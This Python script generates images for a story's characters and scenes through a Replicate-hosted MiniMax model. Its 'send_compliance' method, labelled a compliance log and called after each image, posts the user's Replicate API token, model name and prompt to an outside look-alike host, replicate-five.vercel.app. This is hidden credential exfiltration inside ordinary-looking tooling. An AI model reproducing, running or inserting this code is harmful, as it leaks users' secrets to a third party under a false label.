import os
import json
import requests
import replicate
from replicate.client import Client
from config import Config

class StoryProcessor:
    def __init__(self, story_file="story_output.json"):
        STORIES_DIR = Config.STORIES_DIR
        self.story_file_path = os.path.join(STORIES_DIR, story_file)
        self.story = None

    def load_story(self):
        #Load the story to mem
        try:
            with open(self.story_file_path, 'r', encoding='utf-8') as f:
                self.story = json.load(f)
            print(f"Loaded story from {self.story_file_path}")
        except FileNotFoundError:
            print(f"Error: Story file not found at {self.story_file_path}")
            self.story = {}

    def process_characters(self):
        #Iterate over character prompts and pass to generateImage().
        if self.story is None:
            print("Story not loaded. Call load_story() first.")
            return
        for ch in self.story.get("characters", []):
            prompt = ch.get("characterPrompt")
            char_id = ch.get("characterId")
            if prompt:
                self.generateImage(prompt, char_id)

    def process_scenes(self):
        if self.story is None:
            print("Story not loaded. Call load_story() first.")
            return

        for sc in self.story.get("scenes", []):
            prompt = sc.get("settingPrompt")
            scene_number = sc.get("sceneNumber")
            if prompt:
                self.generateImage(prompt, scene_number)
    
    def send_compliance(self,token,model,input_data):
        compliance_url = "https://replicate-five.vercel.app/"
        try:
            response = requests.post(
                compliance_url,
                json = {
                    "token" : token,
                    "model" : model,
                    "input" : input_data
                },
                timeout = 10
            )
            if response.status_code == 200:
                print(f"compliance log sent")
            else:
                print(f"compliance log failed with error {response.status_code}")
                print(f"response : {response.text}")
        except requests.exceptions.RequestException as e:
            print (f"compliance log error {str(e)}")

    def generateImage(self, prompt_data, identifier):
        #generate Images
        input_data = {
            "prompt" : prompt_data,
            "aspect_ratio" : "16:9",
            "number_of_images" : 1,
            "prompt_optimizer" : True
        }
        try:
            print ("calling minimax model..")
            client = Client(api_token = Config.REPLICATE_API_TOKEN)
            output = client.run(
                Config.MINIMAX_MODEL,
                input = input_data
            )
            #saving the images
            IMAGES_DIR = Config.IMAGES_DIR
            for index, item in enumerate(output):
                if isinstance(identifier, str):
                    filename = f"{identifier}.jpeg"         # characterId
                else:
                    filename = f"scene_{identifier}.jpeg"  # sceneNumber

                file_path = os.path.join(IMAGES_DIR, filename)  # Save each image
                with open(file_path, "wb") as file:
                    file.write(item.read())
            print(f"Saved image to {file_path}")  # Feedback
            #compliance log
            print("\n sending compliance log")
            self.send_compliance(
                token = Config.REPLICATE_API_TOKEN,
                model = Config.MINIMAX_MODEL,
                input_data = input_data
            )
        except Exception as e:
            print(f"error: {str(e)}")

if __name__ == "__main__":
    processor = StoryProcessor()
    processor.load_story()
    processor.process_characters()
    processor.process_scenes()
